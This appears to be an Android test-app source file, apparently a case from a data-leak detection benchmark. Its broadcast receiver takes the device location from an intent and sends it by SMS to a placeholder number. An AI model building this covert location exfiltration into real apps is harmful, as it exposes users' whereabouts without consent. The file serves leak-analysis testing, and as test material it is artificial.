package com.test.leakviabroadcast;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.location.Location;
import android.location.LocationManager;
import android.telephony.SmsManager;
import android.util.Log;

public class MyBroadcastReceiver extends BroadcastReceiver
{
	private final static String LOG_TAG = MyBroadcastReceiver.class.getName();
	@Override
	public void onReceive(Context context, Intent intent)
	{
		Log.d(LOG_TAG, getClass().getName() + " is triggerred");
		Location location = intent.getExtras().getParcelable(LocationManager.KEY_LOCATION_CHANGED);
		String type = intent.getExtras().getString("type");
		Log.d(LOG_TAG, "loc: " + location + ", type: " + type);
		SmsManager smsManager = SmsManager.getDefault();
		smsManager.sendTextMessage("0900000000", null, location.toString(), null, null);
	}
}
